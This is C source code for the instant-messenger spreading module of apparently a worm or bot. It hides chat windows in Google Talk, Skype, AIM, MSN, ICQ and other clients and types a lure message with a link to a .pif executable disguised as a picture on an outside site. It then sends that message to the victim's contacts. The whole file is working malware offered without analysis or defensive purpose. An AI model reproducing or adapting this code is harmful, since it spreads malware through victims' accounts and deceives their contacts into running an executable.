// credits to InTeL for some of the imspread functions SendMessage, Send, Focus, Clear.

#include "includes.h"

char Message[] = "Hey whats up look at my new picture";		// Message To Spam
char Link[] = "http://sexy4life.atspace.com/mypic.pif";				// Link To Spam

#ifndef NO_IMSPREAD

bool InfectIM()
{
	EnumWindows(GoogleTalk, 0);
	EnumWindows(PalTalk, 0);
	EnumWindows(Skype, 0);
	EnumWindows(Gaim, 0);
	EnumWindows(Aim, 0);
	EnumWindows(AimTriton, 0);
	EnumWindows(Msn, 0);
	EnumWindows(Icq, 0);
	return true;
}

bool SendMessage(HWND hwnd, int iWindow)
{
	char szMessage[512] = {0};

	if(iWindow != 0)
	{
		ShowWindow(hwnd, SW_HIDE);
		Focus(hwnd);
		Clear();

		_snprintf(szMessage, sizeof(szMessage), "%s %s", Message, Link);
		for(unsigned short i = 0; i < strlen(szMessage); i++)
		{
			keybd_event(VkKeyScan(szMessage[i]),0,0 , 0);
			keybd_event(VkKeyScan(szMessage[i]),0, KEYEVENTF_KEYUP,0);
			Sleep(100);
		}
		Focus(hwnd);
		Send(iWindow);
	}
	return true;
}

bool Send(int iWindow)
{
	if (iWindow == 2)
		keybd_event(VK_CONTROL,0,0 , 0);

	keybd_event(VK_RETURN,0,0 , 0);
	keybd_event(VK_RETURN,0,KEYEVENTF_KEYUP , 0);
	keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP , 0);

	return true;
}


void Focus(HWND hwnd)
{
	BringWindowToTop(hwnd);
	SetForegroundWindow(hwnd);
	SetFocus(hwnd);
	return;
}

void Clear()
{
	keybd_event(VK_CONTROL,0,0 , 0);
	keybd_event(VkKeyScan('a'),0,0 , 0);
	keybd_event(VK_DELETE,0,0 , 0);
	keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP , 0);
	keybd_event(VkKeyScan('a'),0,KEYEVENTF_KEYUP , 0);
	keybd_event(VK_DELETE,0,KEYEVENTF_KEYUP , 0);
	return;
}
#endif